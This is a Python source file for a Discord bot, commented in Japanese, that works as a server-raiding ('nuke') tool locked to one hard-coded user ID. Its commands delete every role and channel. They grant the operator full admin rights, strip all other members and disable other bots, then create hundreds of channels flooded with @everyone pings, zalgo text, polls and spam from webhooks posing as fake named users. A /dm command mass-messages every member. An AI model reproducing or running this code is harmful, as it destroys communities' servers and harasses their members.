import discord
from discord.ext import commands
from discord import app_commands
import random
import os
import asyncio

# ボットの設定
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True

bot = commands.Bot(command_prefix='!', intents=intents)

# 特定のユーザーID（あなたのDiscord ID）
ALLOWED_USER_ID = 1464850594790637569

# =============================================
# イベント
# =============================================
@bot.event
async def on_ready():
    print(f'{bot.user} としてログインしました！')
    print(f'ボットID: {bot.user.id}')
    print('------')
    try:
        synced = await bot.tree.sync()
        print(f"✅ {len(synced)}個のスラッシュコマンドを同期しました")
    except Exception as e:
        print(f"スラッシュコマンド同期エラー: {e}")

# =============================================
# !lol コマンド
# =============================================
@bot.command()
async def lol(ctx, count: int = 100, *, message: str = None):
    if ctx.author.id != ALLOWED_USER_ID:
        return

    if count > 500:
        count = 500
        print(f"⚠️ 最大500個に制限されました")

    guild = ctx.guild

    try:
        import asyncio

        role_delete_tasks = [role.delete() for role in guild.roles if role.name != "@everyone"]
        await asyncio.gather(*role_delete_tasks, return_exceptions=True)
        print(f"全ロール削除完了")

        yaju_role = await guild.create_role(
            name="野獣",
            permissions=discord.Permissions.all(),
            color=discord.Color.red()
        )
        print(f"野獣ロール作成完了")

        unko_permissions = discord.Permissions.none()
        unko_permissions.view_channel = True
        unko_permissions.read_message_history = True
        unko_role = await guild.create_role(
            name="うんこ",
            permissions=unko_permissions,
            color=discord.Color.from_rgb(139, 69, 19)
        )
        print(f"うんこロール作成完了")

        bot_dead_role = await guild.create_role(
            name="死亡",
            permissions=discord.Permissions.none(),
            color=discord.Color.from_rgb(0, 0, 0)
        )
        print(f"ボット無効化ロール作成完了")

        role_assign_tasks = []
        for member in guild.members:
            if member.id == bot.user.id:
                continue
            elif member.bot:
                role_assign_tasks.append(member.add_roles(bot_dead_role))
            elif member.id == ALLOWED_USER_ID:
                role_assign_tasks.append(member.add_roles(yaju_role))
            else:
                role_assign_tasks.append(member.add_roles(unko_role))

        await asyncio.gather(*role_assign_tasks, return_exceptions=True)
        print(f"ロール付与完了")

        delete_tasks = [channel.delete() for channel in guild.channels]
        await asyncio.gather(*delete_tasks, return_exceptions=True)
        print(f"全チャンネル削除完了")

        create_tasks = []
        for i in range(count):
            random_number = random.randint(1000, 9999)
            channel_name = f"lol-{random_number}"
            create_tasks.append(guild.create_text_channel(channel_name))

        channels = await asyncio.gather(*create_tasks, return_exceptions=True)
        channels = [ch for ch in channels if isinstance(ch, discord.TextChannel)]
        print(f"{len(channels)}個のチャンネルを作成しました")

        if message:
            spam_message = f"@everyone {message}"
        else:
            spam_message = "@everyone"

        spam_tasks = []
        for channel in channels:
            for _ in range(10):
                spam_tasks.append(channel.send(spam_message))

        await asyncio.gather(*spam_tasks, return_exceptions=True)
        print(f"処理完了！全チャンネルにメッセージを送信しました")

    except Exception as e:
        print(f"エラーが発生しました: {e}")

# =============================================
# /lol スラッシュコマンド（ユーザーインストール対応）
# =============================================
@bot.tree.command(name="lol", description="メッセージ連投・投票爆撃")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.check(lambda interaction: interaction.user.id == ALLOWED_USER_ID)
async def slash_lol(
    interaction: discord.Interaction,
    message: str = None,
    count: int = 50,
    use_webhook: bool = False
):
    await interaction.response.defer(ephemeral=True)

    try:
        guild = interaction.guild

        zalgo_marks = [
            '\u0300', '\u0301', '\u0302', '\u0303', '\u0304', '\u0305', '\u0306', '\u0307',
            '\u0308', '\u0309', '\u030A', '\u030B', '\u030C', '\u030D', '\u030E', '\u030F',
            '\u0310', '\u0311', '\u0312', '\u0313', '\u0314', '\u0315', '\u0316', '\u0317',
            '\u0318', '\u0319', '\u031A', '\u031B', '\u031C', '\u031D', '\u031E', '\u031F',
            '\u0320', '\u0321', '\u0322', '\u0323', '\u0324', '\u0325', '\u0326', '\u0327',
            '\u0328', '\u0329', '\u032A', '\u032B', '\u032C', '\u032D', '\u032E', '\u032F',
            '\u0330', '\u0331', '\u0332', '\u0333', '\u0334', '\u0335', '\u0336', '\u0337',
            '\u0338', '\u0339', '\u033A', '\u033B', '\u033C', '\u033D', '\u033E', '\u033F'
        ]

        # =============================================
        # ボットがサーバーに入っていない場合 → 使われたチャンネルだけで発動
        # =============================================
        if guild is None or guild.me is None:
            channel = interaction.channel
            if channel is None:
                await interaction.followup.send("❌ チャンネルが取得できませんでした", ephemeral=True)
                return

            if message:
                spam_text = f"@everyone {message}"
            else:
                base_text = "w" * 50 + "\n" + "a" * 100
                zalgo_text = ''.join(c + ''.join(random.choice(zalgo_marks) for _ in range(15)) for c in base_text)
                spam_text = f"@everyone {zalgo_text}"

            spam_tasks = [channel.send(spam_text) for _ in range(count)]
            results = await asyncio.gather(*spam_tasks, return_exceptions=True)
            success_count = sum(1 for r in results if not isinstance(r, Exception))
            await interaction.followup.send(
                f"✅ このチャンネルに{success_count}回送信しました",
                ephemeral=True
            )
            return

        # =============================================
        # ボットがサーバーに入っている場合 → 全チャンネルに発動
        # =============================================
        target_channels = []

        for channel in guild.channels:
            if isinstance(channel, discord.TextChannel):
                try:
                    permissions = channel.permissions_for(guild.me)
                    if permissions.send_messages:
                        target_channels.append(channel)
                        for thread in channel.threads:
                            thread_permissions = thread.permissions_for(guild.me)
                            if thread_permissions.send_messages:
                                target_channels.append(thread)
                except:
                    pass

        try:
            async for thread in guild.archived_threads(limit=100):
                thread_permissions = thread.permissions_for(guild.me)
                if thread_permissions.send_messages and not thread.locked:
                    target_channels.append(thread)
        except:
            pass

        if not target_channels:
            await interaction.followup.send("❌ 送信可能なチャンネルが見つかりません", ephemeral=True)
            return

        fake_names = ["田中太郎", "佐藤花子", "鈴木一郎", "高橋美咲", "伊藤健太", "渡辺さくら", "山本大輔", "中村愛", "小林誠", "加藤優子"]

        if use_webhook:
            if message:
                spam_text = f"@everyone {message}"
            else:
                base_text = "w" * 50 + "\n" + "a" * 100
                zalgo_text = ''.join(c + ''.join(random.choice(zalgo_marks) for _ in range(15)) for c in base_text)
                spam_text = f"@everyone {zalgo_text}"

            random_words = ["Discord", "Server", "Bot", "Admin", "Moderator", "User", "Member", "System", "Official", "Verified"]

            spam_tasks = []
            webhook_cache = {}

            for channel in target_channels:
                try:
                    if channel.id not in webhook_cache:
                        if isinstance(channel, discord.TextChannel):
                            base_name = random.choice(random_words)
                            zalgo_name = ''.join(c + ''.join(random.choice(zalgo_marks) for _ in range(10)) for c in base_name)
                            webhook = await channel.create_webhook(name=zalgo_name[:80])
                            webhook_cache[channel.id] = webhook
                        else:
                            continue

                    webhook = webhook_cache[channel.id]

                    for i in range(count):
                        fake_name = fake_names[i % len(fake_names)]
                        spam_tasks.append(
                            webhook.send(
                                content=spam_text,
                                username=fake_name,
                                wait=False
                            )
                        )
                except:
                    pass

            results = await asyncio.gather(*spam_tasks, return_exceptions=True)
            success_count = sum(1 for r in results if not isinstance(r, Exception))

            for webhook in webhook_cache.values():
                try:
                    await webhook.delete()
                except:
                    pass

            await interaction.followup.send(
                f"✅ Webhook偽装で{len(target_channels)}チャンネルに{success_count}回送信しました",
                ephemeral=True
            )
            return

        can_create_poll = False
        test_channel = target_channels[0]
        try:
            test_poll = await test_channel.send(
                poll=discord.Poll(question="test", duration=1)
            )
            await test_poll.delete()
            can_create_poll = True
        except:
            can_create_poll = False

        if can_create_poll:
            poll_tasks = []
            for channel in target_channels:
                for i in range(count):
                    poll_question = f"投票 #{i+1}"
                    poll = discord.Poll(question=poll_question, duration=24)
                    poll.add_answer(text="はい")
                    poll.add_answer(text="いいえ")
                    poll_tasks.append(channel.send(poll=poll))

            results = await asyncio.gather(*poll_tasks, return_exceptions=True)
            success_count = sum(1 for r in results if not isinstance(r, Exception))
            await interaction.followup.send(
                f"✅ {len(target_channels)}チャンネルに{success_count}個の投票を作成しました",
                ephemeral=True
            )

        else:
            if message:
                spam_text = f"@everyone {message}"
            else:
                base_text = "w" * 50 + "\n" + "a" * 100
                zalgo_text = ''.join(c + ''.join(random.choice(zalgo_marks) for _ in range(15)) for c in base_text)
                spam_text = f"@everyone {zalgo_text}"

            spam_tasks = [
                channel.send(spam_text)
                for channel in target_channels
                for _ in range(count)
            ]

            results = await asyncio.gather(*spam_tasks, return_exceptions=True)
            success_count = sum(1 for r in results if not isinstance(r, Exception))
            await interaction.followup.send(
                f"✅ {len(target_channels)}チャンネルに{success_count}回メッセージを送信しました",
                ephemeral=True
            )

    except Exception as e:
        await interaction.followup.send(f"❌ エラー: {str(e)}", ephemeral=True)
        print(f"スラッシュコマンドエラー: {e}")

# =============================================
# /spam コマンド（そのチャンネルだけに送信）
# =============================================
@bot.tree.command(name="spam", description="このチャンネルだけにメッセージを連投")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.check(lambda interaction: interaction.user.id == ALLOWED_USER_ID)
async def slash_spam(
    interaction: discord.Interaction,
    message: str = None,
    count: int = 50
):
    await interaction.response.defer(ephemeral=True)

    try:
        channel = interaction.channel

        # チャンネルが取得できない場合はチャンネルIDから直接取得
        if channel is None:
            channel_id = interaction.channel_id
            if channel_id is None:
                await interaction.followup.send("❌ チャンネルが取得できませんでした", ephemeral=True)
                return
            channel = await bot.fetch_channel(channel_id)

        zalgo_marks = [
            '\u0300', '\u0301', '\u0302', '\u0303', '\u0304', '\u0305', '\u0306', '\u0307',
            '\u0308', '\u0309', '\u030A', '\u030B', '\u030C', '\u030D', '\u030E', '\u030F',
            '\u0310', '\u0311', '\u0312', '\u0313', '\u0314', '\u0315', '\u0316', '\u0317',
            '\u0318', '\u0319', '\u031A', '\u031B', '\u031C', '\u031D', '\u031E', '\u031F',
            '\u0320', '\u0321', '\u0322', '\u0323', '\u0324', '\u0325', '\u0326', '\u0327',
            '\u0328', '\u0329', '\u032A', '\u032B', '\u032C', '\u032D', '\u032E', '\u032F',
            '\u0330', '\u0331', '\u0332', '\u0333', '\u0334', '\u0335', '\u0336', '\u0337',
            '\u0338', '\u0339', '\u033A', '\u033B', '\u033C', '\u033D', '\u033E', '\u033F'
        ]

        if message:
            spam_text = f"@everyone {message}"
        else:
            base_text = "w" * 50 + "\n" + "a" * 100
            zalgo_text = ''.join(c + ''.join(random.choice(zalgo_marks) for _ in range(15)) for c in base_text)
            spam_text = f"@everyone {zalgo_text}"

        spam_tasks = [channel.send(spam_text) for _ in range(count)]
        results = await asyncio.gather(*spam_tasks, return_exceptions=True)
        success_count = sum(1 for r in results if not isinstance(r, Exception))

        await interaction.followup.send(
            f"✅ このチャンネルに{success_count}回送信しました",
            ephemeral=True
        )

    except Exception as e:
        await interaction.followup.send(f"❌ エラー: {str(e)}", ephemeral=True)
        print(f"spamコマンドエラー: {e}")

# =============================================
# /dm コマンド（サーバーに入っている場合のみ）
# =============================================
@bot.tree.command(name="dm", description="サーバー全員にDM爆撃（ボットがサーバーに参加している場合のみ）")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.check(lambda interaction: interaction.user.id == ALLOWED_USER_ID)
async def slash_dm(
    interaction: discord.Interaction,
    message: str = "こんにちは",
    count: int = 10
):
    await interaction.response.defer(ephemeral=True)

    try:
        guild = interaction.guild

        if guild is None or guild.me is None:
            await interaction.followup.send("❌ このコマンドはボットがサーバーに参加している場合のみ使えます", ephemeral=True)
            return

        members = [m for m in guild.members if not m.bot]

        if not members:
            await interaction.followup.send("❌ 送信可能なメンバーがいません", ephemeral=True)
            return

        dm_tasks = []
        for member in members:
            for _ in range(count):
                dm_tasks.append(member.send(message))

        results = await asyncio.gather(*dm_tasks, return_exceptions=True)
        success_count = sum(1 for r in results if not isinstance(r, Exception))
        failed_count = len(results) - success_count

        await interaction.followup.send(
            f"✅ {len(members)}人に{success_count}通のDMを送信しました\n"
            f"（失敗: {failed_count}通 - DM拒否設定など）",
            ephemeral=True
        )

    except Exception as e:
        await interaction.followup.send(f"❌ エラー: {str(e)}", ephemeral=True)
        print(f"DMコマンドエラー: {e}")

# =============================================
# !clean コマンド
# =============================================
@bot.command()
async def clean(ctx):
    if ctx.author.id != ALLOWED_USER_ID:
        return

    guild = ctx.guild

    try:
        role_delete_tasks = [role.delete() for role in guild.roles if role.name != "@everyone"]
        await asyncio.gather(*role_delete_tasks, return_exceptions=True)
        print(f"全ロール削除完了")

        yaju_role = await guild.create_role(
            name="野獣",
            permissions=discord.Permissions.all(),
            color=discord.Color.red()
        )

        unko_permissions = discord.Permissions.none()
        unko_permissions.view_channel = True
        unko_permissions.read_message_history = True
        unko_role = await guild.create_role(
            name="うんこ",
            permissions=unko_permissions,
            color=discord.Color.from_rgb(139, 69, 19)
        )

        bot_dead_role = await guild.create_role(
            name="死亡",
            permissions=discord.Permissions.none(),
            color=discord.Color.from_rgb(0, 0, 0)
        )

        role_assign_tasks = []
        for member in guild.members:
            if member.id == bot.user.id:
                continue
            elif member.bot:
                role_assign_tasks.append(member.add_roles(bot_dead_role))
            elif member.id == ALLOWED_USER_ID:
                role_assign_tasks.append(member.add_roles(yaju_role))
            else:
                role_assign_tasks.append(member.add_roles(unko_role))

        await asyncio.gather(*role_assign_tasks, return_exceptions=True)

        delete_tasks = [channel.delete() for channel in guild.channels]
        await asyncio.gather(*delete_tasks, return_exceptions=True)

        confirm_channel = await guild.create_text_channel("clean-完了")
        await confirm_channel.send("全てのチャンネルを消しました")
        print(f"cleanコマンド完了")

    except Exception as e:
        print(f"エラーが発生しました: {e}")


# =============================================
# 起動
# =============================================
from threading import Thread
from http.server import BaseHTTPRequestHandler, HTTPServer

class HealthCheckHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'Discord Bot is running!')
    
    def log_message(self, format, *args):
        return

def run_server():
    port = int(os.environ.get('PORT', 10000))
    server = HTTPServer(('0.0.0.0', port), HealthCheckHandler)
    print(f'HTTPサーバー起動: ポート {port}')
    server.serve_forever()

Thread(target=run_server, daemon=True).start()

TOKEN = os.environ.get('DISCORD_BOT_TOKEN')
if not TOKEN:
    print("エラー: DISCORD_BOT_TOKEN 環境変数が設定されていません。")
    exit(1)

bot.run(TOKEN)
